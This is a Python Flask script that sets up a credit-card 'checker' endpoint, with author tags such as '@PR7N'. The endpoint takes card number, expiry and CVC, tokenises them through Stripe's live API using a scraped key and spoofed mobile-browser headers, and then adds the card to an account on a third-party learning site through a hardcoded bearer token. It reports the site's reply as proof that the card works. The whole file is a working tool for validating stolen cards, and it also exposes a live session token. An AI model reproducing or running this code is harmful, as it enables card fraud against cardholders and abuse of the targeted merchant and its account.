try:
	import requests
	import re,json
	import random
	import time
	import string
	import base64
	from bs4 import BeautifulSoup
	from user_agent import *
	import random
	import string
	import requests
	import requests,user_agent,re,base64,json,random
except:
	pass
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/stripe', methods=['GET', 'POST'])
def testapi():
	try:
		import requests
		import re,json
		import random
		import time
		import string
		import base64
		from bs4 import BeautifulSoup
	#	from user_agent import *
		import random
		import string
		import requests
		import requests,user_agent,re,base64,json,random
		try:
			card_line = request.args.get('cc')
		except:
			return jsonify({"error": "No JSON data received"})
		# فصل القيم
		card, m, exp_year, cvc = card_line.strip().split('|')
		
		# معالجة السنة (YY → YYYY)
		if len(exp_year) == 2:
		    exp_year = "20" + exp_year
		headers = {
		    'authority': 'api.stripe.com',
		    'accept': 'application/json',
		    'accept-language': 'en-US',
		    'content-type': 'application/x-www-form-urlencoded',
		    'origin': 'https://js.stripe.com',
		    'referer': 'https://js.stripe.com/',
		    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
		}
		
		data = f'time_on_page=154973&guid=90be8a70-c6f0-4424-846d-f2e76b7ca4bc4f9db3&muid=573507ed-a21d-4b39-8d06-0ce8d816871fbf930d&sid=33ea5ca1-093e-4518-8b21-6640242cf05d852b38&key=pk_live_HPz22KIbvhjSbtZaIcmZAmfK&payment_user_agent=stripe.js%2F78ef418&card[number]={card}&card[exp_month]={m}&card[exp_year]={exp_year}&card[cvc]={cvc}'
		
		response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
		id = response.json()['id']
		import requests
		
		headers = {
		    'authority': 'backend.robogarden.ca',
		    'accept': 'application/json, text/plain, */*',
		    'accept-language': 'en-SD,en;q=0.9',
		    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOjE5NzQ5NTksImlzcyI6Imh0dHA6Ly9iYWNrZW5kLnJvYm9nYXJkZW4uY2EvZW4vbG9naW4iLCJpYXQiOjE3NjkwNzQ4NDgsImV4cCI6MTc2OTE2MTI0OCwibmJmIjoxNzY5MDc0ODQ4LCJqdGkiOiJKV3Z5QThaTEJuSmFZSThhIiwiaXNfZ29vZ2xlX2xvZ2luIjpmYWxzZX0._QaNZN2Nwz4OWgZlRMqqR0n8Gg8hY2-Oj1BWAmMkGzQ',
		    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8;',
		    'origin': 'https://playground.robogarden.ca',
		    'referer': 'https://playground.robogarden.ca/',
		    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
		}
		
		data = {
		    'stripe_token': id,
		}
		
		response = requests.post('https://backend.robogarden.ca/en/user/card', headers=headers, data=data)
		if 'Payment information updated successfully' in response.text:
			return jsonify({
			"By" : "@PR7N",
	        "success": True,
	        "Response":"Payment Method Added Successfully.",
	        "Payment gateway": "STRIPE AUTHE"
	    })
		else:
			return jsonify({
	        "success": False,
	        "Response": response.json()['errorMessage'],
	        "Payment gateway": "STRIPE AUTHE",
	        "By" : "@PR_7N"
	    })
	except:
		pass
if __name__ == '__main__':
    app.run()
		#print(response.json()['errorMessage'])
		#print(response.text)
		#{"Object":"Payment information updated successfully","error_source":[],"errorMessage":[],"message":[],"status_code":200}
		
